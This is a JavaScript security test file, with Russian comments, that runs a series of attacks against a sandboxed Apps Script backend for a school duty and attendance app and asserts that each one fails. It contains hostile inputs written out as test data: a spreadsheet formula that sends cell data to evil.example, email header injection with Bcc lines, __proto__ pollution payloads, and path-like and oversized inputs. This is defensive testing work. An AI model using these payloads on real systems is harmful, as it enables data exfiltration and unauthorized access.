// Атаки на настоящий Code.gs (песочница): без прав, дежурным, подмена автора и времени, инъекции, перегрузка, утечки.
// Каждая строка — одна атака; тест падает, если хоть одна прошла.
import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { makeEnv, seed } from './helpers.mjs';
import { makeSandbox, call, run } from '../helpers/gas-sandbox.mjs';
import { exportData } from '../../js/domain/backup.js';
const sha = (t) => crypto.createHash('sha256').update(t).digest('hex');
const U = 'u'.repeat(32), A = 'a'.repeat(32), P = 'p'.repeat(32), R = 'r'.repeat(32), X = 'x'.repeat(32);
const kz = (d = 0) => new Date(Date.now() + 5 * 3600000 + d * 86400000).toISOString().slice(0, 10);
const sb = makeSandbox(); const token = run(sb, 'setup()');
const post = (o) => call(sb, 'doPost', { postData: { contents: typeof o === 'string' ? o : JSON.stringify(o) } });
const env = await makeEnv(); await seed(env, 3);
post({ type: 'live', action: 'seed', token, data: exportData(env.S()) });
const req = (dev, name, extra = {}) => post({ type: 'access', action: 'request', deviceHash: sha(dev), name, ...extra });
const grant = (dev, name, role) => { req(dev, name); return post({ type: 'access', action: 'decide', token, id: sha(dev).slice(0, 12), decision: 'allow', role }); };
grant(U, 'Дежурный Тест', 'user'); grant(A, 'Админ Тест', 'admin');
req(P, 'Ожидающий Тест'); req(R, 'Отозванный Тест'); post({ type: 'access', action: 'decide', token, id: sha(R).slice(0, 12), decision: 'allow', role: 'user' }); post({ type: 'access', action: 'decide', token, id: sha(R).slice(0, 12), decision: 'revoke' });
const state = () => JSON.parse(call(sb, 'doGet', { parameter: { action: 'backup', token } }).backup);
const sid = env.S().students[0].id;
const rec = (o = {}) => ({ id: `${kz()}:${sid}`, date: kz(), studentId: sid, place: 'sleeping', ...o });
const batch = (b) => ({ put: {}, del: {}, clear: [], settings: {}, ...b });
const res = [];
const t = (name, ok, info = '') => { res.push([ok, name, info]); };
const live = (cred, action, extra = {}) => post({ type: 'live', action, ...cred, ...extra });
const cu = { device: U }, ca = { device: A }, co = { token };

// --- 1. вход без прав
for (const [n, cred] of [['без данных', {}], ['чужой токен', { token: 'x'.repeat(40) }], ['пустой токен', { token: '' }], ['неизвестное устройство', { device: X }], ['ожидающее устройство', { device: P }], ['отозванное устройство', { device: R }], ['короткий секрет', { device: 'abc' }], ['устройство-массив', { device: ['a'] }], ['токен-объект', { token: { $ne: 1 } }]])
  for (const act of ['pull', 'push', 'log', 'marks', 'stats', 'seed', 'sheets', 'exportlog']) { const r = live(cred, act, { sinceRev: 0, baseRev: 0, batches: [] }); if (r.ok) t(`1. ${n}: ${act} прошёл!`, false, JSON.stringify(r).slice(0, 80)); }
t('1. неавторизованные запросы закрыты', !res.some((r) => !r[0]));
t('1. GET без токена закрыт', call(sb, 'doGet', { parameter: {} }).ok === false);
t('1. GET backup с чужим токеном', call(sb, 'doGet', { parameter: { action: 'backup', token: 'zzz' } }).ok === false);
t('1. access list без прав', post({ type: 'access', action: 'list' }).ok === false && post({ type: 'access', action: 'list', device: X }).ok === false);
t('1. решение без прав', post({ type: 'access', action: 'decide', device: X, id: sha(P).slice(0, 12), decision: 'allow' }).ok === false);

// --- 2. повышение прав дежурным
for (const act of ['log', 'marks', 'stats', 'seed', 'sheets', 'exportlog']) t(`2. дежурный: ${act} закрыт`, live(cu, act, { data: exportData(env.S()), from: kz(), to: kz() }).ok === false);
t('2. дежурный: список запросов закрыт', post({ type: 'access', action: 'list', device: U }).ok === false);
t('2. дежурный: решение закрыто', post({ type: 'access', action: 'decide', device: U, id: sha(P).slice(0, 12), decision: 'allow', role: 'admin' }).ok === false);
const wrong = (b) => { const r = live(cu, 'push', { baseRev: run(sb, 'getRev_()'), batches: [batch(b)] }); return r.applied === 0 || r.ok === false; };
t('2. дежурный: правка учеников отклонена', wrong({ put: { students: [{ id: 'evil', lastName: 'Хакер', firstName: 'Х' }] } }));
t('2. дежурный: удаление учеников отклонено', wrong({ del: { students: [sid] } }));
t('2. дежурный: настройки отклонены', wrong({ settings: { lyceumName: 'Взлом' } }));
t('2. дежурный: clear отклонён', wrong({ clear: ['students'] }));
t('2. после атак база цела', state().students.length === env.S().students.length && !state().students.some((s) => s.id === 'evil'));
t('2. role/owner в теле запроса игнорируются', live({ device: U, role: 'admin', owner: true, isAdmin: true }, 'log').ok === false);
t('2. заявка с wantRole admin не даёт админа', (() => { req('w'.repeat(32), 'Хочу Админа', { wantRole: 'admin' }); return post({ type: 'access', action: 'status', device: 'w'.repeat(32) }).status === 'pending'; })());
t('2. устройство-админ не назначает админов', post({ type: 'access', action: 'decide', device: A, id: sha(P).slice(0, 12), decision: 'allow', role: 'admin' }).error === 'owner-only');
t('2. устройство-админ не очищает базу', (() => { const r = live(ca, 'push', { baseRev: run(sb, 'getRev_()'), batches: [batch({ clear: ['students'] })] }); return state().students.length === env.S().students.length; })());

// --- 3. подделка отметок
const push = (cred, b) => live(cred, 'push', { baseRev: run(sb, 'getRev_()'), batches: [batch(b)] });
push(cu, { put: { rounds: [rec({ by: 'Директор Школы', at: '2099-01-01T00:00:00Z' })] } });
let r0 = state().rounds.find((x) => x.studentId === sid);
t('3. имя автора подделать нельзя', r0 && r0.by === 'Дежурный Тест', r0 && r0.by);
t('3. время из будущего не принимается', r0 && !r0.at.startsWith('2099'), r0 && r0.at);
push(cu, { put: { rounds: [rec({ id: `${kz(-30)}:${sid}`, date: kz(-30) })] } });
t('3. отметка на старую дату отброшена', !state().rounds.some((x) => x.date === kz(-30)));
push(cu, { put: { rounds: [rec({ id: `${kz()}:ghost`, studentId: 'ghost' })] } });
t('3. отметка на несуществующего ученика отброшена', !state().rounds.some((x) => x.studentId === 'ghost'));
t('3. не-статус отклонён', (() => { const r = push(cu, { put: { rounds: [rec({ place: 'admin' })] } }); return r.rejected >= 1 || r.ok === false; })());
t('3. id не по формату отклонён', (() => { const r = push(cu, { put: { rounds: [rec({ id: 'x' })] } }); return r.rejected >= 1 || r.ok === false; })());

// --- 4. инъекции
const polluted = push(co, { put: { ['__proto__']: [{ id: 'a' }], constructor: [{ id: 'b' }] }, del: { ['__proto__']: ['x'] } });
t('4. __proto__/constructor в хранилищах не ломает сервер', ({}).polluted === undefined && polluted.ok !== undefined);
push(co, { put: { students: [{ id: '__proto__', lastName: 'П', firstName: 'П' }, { id: 'constructor', lastName: 'К', firstName: 'К' }] } });
t('4. ключи __proto__/constructor как id не загрязняют объекты', ({}).lastName === undefined && Object.prototype.lastName === undefined);
const fx = req('f'.repeat(32), '=IMPORTDATA("https://evil.example/"&A1)', { note: '=HYPERLINK("x")', email: 'a@b.co' });
t('4. формула в имени запроса: запрос принят как текст', fx.ok === true, JSON.stringify(fx).slice(0, 60));
const mailBody = sb.mails.at(-1) ? sb.mails.at(-1)[1] + sb.mails.at(-1)[2] : '';
t('4. письмо без переводов строки в теме (инъекция заголовков)', !/[\r\n]/.test(sb.mails.at(-1)?.[1] || ''));
const nl = req('g'.repeat(32), 'Имя\r\nBcc: evil@example.com', { email: 'a@b.co' });
t('4. перевод строки в имени не попадает в тему письма', !/[\r\n]/.test(sb.mails.at(-1)?.[1] || ''));
t('4. email-инъекция отклонена', req('h'.repeat(32), 'Тест Тестов', { email: 'a@b.co\nBcc: evil@example.com' }).error === 'bad-email');
t('4. гигантское имя обрезано', (() => { req('i'.repeat(32), 'А'.repeat(100000)); return true; })());
// --- 5. DoS / лимиты
t('5. пакет > лимита операций отклонён', (() => { const big = Array.from({ length: 6000 }, (_, i) => ({ id: `${kz()}:${sid}${i}`, date: kz(), studentId: sid, place: 'sick' })); const r = push(cu, { put: { rounds: big } }); return r.rejected >= 1 || r.ok === false || r.applied === 0; })());
t('5. запись > MAX_RECORD отклонена', (() => { const r = push(co, { put: { students: [{ id: 'huge', lastName: 'Я'.repeat(50000), firstName: 'Я' }] } }); return !state().students.some((s) => s.id === 'huge'); })());
t('5. период отчёта > 400 дней отклонён', live(ca, 'marks', { from: kz(-500), to: kz() }).ok === false);
t('5. неверные даты отчёта отклонены', live(ca, 'marks', { from: 'DROP TABLE', to: kz() }).ok === false);
t('5. лимит заявок в час', (() => { let blocked = false; for (let i = 0; i < 40; i++) { const r = req(String(i).padStart(2, '0').repeat(16), `Спамер ${i}`); if (r.ok === false) blocked = true; } return blocked; })());
t('5. не-JSON тело не роняет скрипт', post('<<<not json').ok === false && post('null').ok === false && post('[]').ok === false);
t('5. неизвестное действие/тип', post({ type: 'live', action: '../../etc', token }).ok === false && post({ type: 'nope' }).ok === false);
t('5. limit журнала ограничен', (() => { const r = live(ca, 'log', { limit: 1e9 }); return r.ok && r.rows.length <= 200; })());
t('5. фильтр журнала: регэксп/спецсимволы безопасны', live(ca, 'log', { actor: '.*(((', target: '\\' }).ok === true);

// --- 6. утечки
const pull = live(cu, 'pull', { sinceRev: 0 });
const leaks = JSON.stringify(pull.data || {});
t('6. дежурный не получает дат рождения/заметок/контактов', !/birthDate|"notes"|"phone"|"email"|contacts/.test(leaks));
t('6. ответ дежурному не содержит токена/хэшей устройств', !leaks.includes(token) && !leaks.includes(sha(U)));
const list = post({ type: 'access', action: 'list', token }).requests;
t('6. список запросов не раскрывает полный хэш устройства', list.every((x) => !JSON.stringify(x).includes(sha(U))), 'id=' + list[0]?.id);
t('6. ответ status не раскрывает чужих данных', JSON.stringify(post({ type: 'access', action: 'status', device: X })) === '{"ok":true,"status":"none"}' || post({ type: 'access', action: 'status', device: X }).status === 'none');

const broken = res.filter((r) => !r[0]).map((r) => `${r[1]} ${r[2] || ''}`);
test(`атаки на сервер: ${res.length} проверок, ни одна не прошла`, () => { assert.deepEqual(broken, []); assert.ok(res.length >= 45); });
